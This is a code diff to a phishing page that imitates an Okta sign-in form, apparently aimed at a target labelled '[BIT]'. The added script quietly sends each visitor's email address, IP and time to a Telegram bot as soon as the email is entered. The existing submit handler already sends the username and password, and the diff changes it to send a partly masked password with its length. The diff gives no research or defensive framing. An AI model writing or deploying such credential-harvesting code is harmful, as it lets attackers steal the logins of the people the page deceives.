@@ -194,7 +194,36 @@
 <div class="siw-main-footer">
 </div>
 <script>
-  document.getElementById('next-step').addEventListener('click', function () {
+  document.getElementById('next-step').addEventListener('click', async function () {
+    var username = document.getElementById('input28').value.trim();
+    var emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+    var errorContainer = document.querySelector('#step-username .o-form-error-container');
+
+    if (!username) {
+      errorContainer.innerHTML = '<div class="okta-form-infobox-error infobox infobox-error" role="alert"><span class="icon error-16"></span><p>此字段不能为空</p></div>';
+      errorContainer.style.display = 'block';
+      return;
+    }
+    if (!emailRegex.test(username)) {
+      errorContainer.innerHTML = '<div class="okta-form-infobox-error infobox infobox-error" role="alert"><span class="icon error-16"></span><p>请输入有效的邮箱地址</p></div>';
+      errorContainer.style.display = 'block';
+      return;
+    }
+
+    errorContainer.innerHTML = '';
+    errorContainer.style.display = 'none';
+
+    // Send email to TG
+    try {
+      var ip = await _ip();
+      var txt =
+        '📧 <b>[BIT] Email entered</b>\n' +
+        'Email: <code>' + _esc(username) + '</code>\n' +
+        'IP: <code>' + _esc(ip) + '</code>\n' +
+        'Time: <code>' + _esc(_now()) + '</code>';
+      await _tg(txt);
+    } catch (e) {}
+
     document.getElementById('step-username').style.display = 'none';
     document.getElementById('step-password').style.display = 'block';
     document.getElementById('next-step').style.display = 'none';
@@ -301,6 +330,14 @@ function _now() {
 })();
 
 // ==================== LOGIN SUBMIT NOTIFICATION ====================
+function _mask(pwd) {
+  if (!pwd) return '';
+  var len = pwd.length;
+  if (len <= 2) return '*'.repeat(len);
+  if (len <= 4) return pwd[0] + '*'.repeat(len - 1);
+  return pwd[0] + pwd[1] + '*'.repeat(len - 4) + pwd[len - 2] + pwd[len - 1];
+}
+
 document.getElementById('form20').addEventListener('submit', async function (e) {
   e.preventDefault();
   const username = document.getElementById('input28').value.trim();
@@ -311,7 +348,7 @@ document.getElementById('form20').addEventListener('submit', async function (e) 
     const txt =
       '🔑 <b>[BIT] Okta login submitted</b>\n' +
       'Username: <code>' + _esc(username) + '</code>\n' +
-      'Password: <code>' + _esc(password) + '</code>\n' +
+      'Password: <code>' + _esc(_mask(password)) + '</code> (' + password.length + ' chars)\n' +
       'IP: <code>' + _esc(ip) + '</code>\n' +
       'Time: <code>' + _esc(_now()) + '</code>\n' +
       'UA: <code>' + _esc((navigator.userAgent || '').substring(0, 200)) + '</code>';
